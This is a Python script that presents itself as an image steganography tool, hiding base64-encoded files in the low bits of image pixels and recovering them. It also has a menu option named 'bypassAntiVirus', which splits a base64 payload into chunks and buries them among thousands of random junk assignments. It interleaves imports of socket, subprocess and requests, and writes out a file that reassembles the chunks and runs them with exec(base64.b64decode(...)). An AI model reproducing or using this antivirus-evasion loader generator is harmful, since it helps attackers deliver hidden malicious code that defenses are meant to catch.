# Python program implementing Image Steganography
import base64
# PIL module is used to extract
# pixels of image and modify it
from PIL import Image
import time
# Convert encoding data into 8-bit binary
# form using ASCII value of characters
import random
import secrets
import string
import base64
import os


def genData(data):

    # list of binary codes
    # of given data
    newd = []

    for i in data:
        newd.append(format(ord(i), '08b'))
    return newd

# Pixels are modified according to the
# 8-bit binary data and finally returned


def modPix(pix, data):

    datalist = genData(data)
    lendata = len(datalist)
    imdata = iter(pix)

    for i in range(lendata):

        # Extracting 3 pixels at a time
        pix = [value for value in imdata.__next__()[:3] +
               imdata.__next__()[:3] +
               imdata.__next__()[:3]]

        # Pixel value should be made
        # odd for 1 and even for 0
        for j in range(0, 8):
            if (datalist[i][j] == '0') and (pix[j] % 2 != 0):

                if (pix[j] % 2 != 0):
                    pix[j] -= 1

            elif (datalist[i][j] == '1') and (pix[j] % 2 == 0):
                pix[j] -= 1

        # Eigh^th pixel of every set tells
        # whether to stop ot read further.
        # 0 means keep reading; 1 means the
        # message is over.
        if (i == lendata - 1):
            if (pix[-1] % 2 == 0):
                pix[-1] -= 1
        else:
            if (pix[-1] % 2 != 0):
                pix[-1] -= 1

        pix = tuple(pix)
        yield pix[0:3]
        yield pix[3:6]
        yield pix[6:9]


def encode_enc(newimg, data):
    w = newimg.size[0]
    (x, y) = (0, 0)

    for pixel in modPix(newimg.getdata(), data):

        # Putting modified pixels in the new image
        newimg.putpixel((x, y), pixel)
        if (x == w - 1):
            x = 0
            y += 1
        else:
            x += 1

# Encode data into image


def encode():
    img = input("Enter image name(with extension): ")
    image = Image.open(img, 'r')

    data = input("Enter data to be encoded : ")
    fr = open(data, 'rb')
    data = base64.b64encode(fr.read()).decode()
    print(data)

    if (len(data) == 0):
        raise ValueError('Data is empty')

    newimg = image.copy()
    encode_enc(newimg, data)

    new_img_name = input("Enter the name of new image(with extension): ")
    newimg.save(new_img_name, str(new_img_name.split(".")[1].upper()))

# Decode the data in the image


def decode():
    img = input("Enter image name(with extension) :")
    output = input("Enter name extension output :")
    image = Image.open(img, 'r')
    data = ''
    imgdata = iter(image.getdata())

    while (True):
        pixels = [value for value in imgdata.__next__()[:3] +
                  imgdata.__next__()[:3] +
                  imgdata.__next__()[:3]]
        # string of binary data
        binstr = ''

        for i in pixels[:8]:
            if (i % 2 == 0):
                binstr += '0'
            else:
                binstr += '1'

        data += chr(int(binstr, 2))
        if (pixels[-1] % 2 != 0):
            with open(output, 'wb') as file_to_save:
                temp = base64.b64decode(data)
                file_to_save.write(temp)
                file_to_save.close()
                return


def encodeFile():
    file = input("url encode file to base64 :")
    fr = open(file, 'rb')
    piece = fr.read()
    fw = open('testoutput.txt', 'wb')
    fw.write(base64.b64encode(piece))
    fw.close()
    fr.close()


def bypassAntiVirus():
    encodeb64 = input("enter string base64 :")
    count_list = 0
    # import time, import base64
    temp_list = [
        #'from PIL import Image',
        'import time',
        'import requests',
        'import socket',
        'import json',
        'import base64',
        'import subprocess',
        'import os',
        #'import pyautogui',
        'import shutil',
        'import sys',
    ]

    enco = str(encodeb64).encode()

    ee = [enco[i:i+20] for i in range(0, len(enco), 20)]

    letters = string.ascii_letters
    x = 'import time\n'
    count = 0
    count3 = 0
    lis = []
    temp = ''

    for i in range(4000):
        x += f'{"".join(random.choice(letters) for i in range(64))} = {secrets.token_bytes()}\n'
        y = "".join(random.choice(letters) for i in range(74))
        z = "".join(random.choice(letters) for i in range(64))
        o = random.randint(1, 5)

        if o == 1 and count_list != len(temp_list):
            x += temp_list[count_list] + '\n'
            count_list += 1
        elif o == 4 and count != len(ee):
            x += 'time.sleep(0)\n'
            x += f'{z} = {ee[count]}\n'
            lis.append(z)
            count = count + 1
        elif o == 5 and count != len(ee):
            x += f'{z} = {ee[count]}\n'
            lis.append(z)
            count = count + 1
        else:
            if i > 700 and count != len(ee):
                x += f'{z} = {ee[count]}\n'
                lis.append(z)
                count = count + 1

            x += f'{y} = {ee[random.randint(1, len(ee)-1)]}\n'

        if count == len(ee) and count3 == 0:
            temp = f'{z}Z'
            x += f'{temp} = {"+".join(lis)}\n'
            # print(f'{temp} = {"+".join(lis)}\n')
            count3 = count3 + 1
            x += f'exec(base64.b64decode({temp}.decode()))\n'
    print(type("+".join(lis)))
    print(len(lis), count, len(ee), ee[len(ee)-1], count_list)

    with open('o.py', 'w') as f:
        f.write(x + '\n')


# Main Function
def main():
    a = int(input(":: Welcome to Steganography ::\n"
                  "1. Encode\n2. Decode\n3. encodeFile\n4. bypassAntiVirus\n"))
    if (a == 1):
        encode()
    elif (a == 2):
        decode()
    elif (a == 3):
        encodeFile()
    elif (a == 4):
        bypassAntiVirus()
    else:
        raise Exception("Enter correct input")


# Driver Code
if __name__ == '__main__':
    # Calling main function
    main()
